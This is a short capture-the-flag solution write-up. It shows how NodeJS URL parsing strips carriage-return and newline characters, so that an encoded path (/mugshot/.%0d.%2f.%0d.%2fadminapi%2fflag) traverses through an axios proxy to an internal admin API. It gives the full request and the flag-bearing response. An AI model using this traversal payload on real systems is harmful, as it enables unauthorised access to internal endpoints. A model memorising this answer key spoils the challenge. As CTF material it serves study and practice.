# solution - integrated

NodeJS `URL` strips `\r` (`\x0d`) and `\n` (`\x0a`) control characters from URL paths, which is done before `axios` builds and sends the request.

## Solution request

```http
GET /mugshot/.%0d.%2f.%0d.%2fadminapi%2fflag HTTP/1.1
Host: 192.168.122.1:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Priority: u=5, i

```

*Response for the above request*
```http
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
Cache-Control: public, max-age=3600
Content-Type: application/json; charset=utf-8
Content-Length: 37
Date: Tue, 13 Oct 2026 15:18:22 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"flag":"EMU{real_flag_on_deployed}"}
```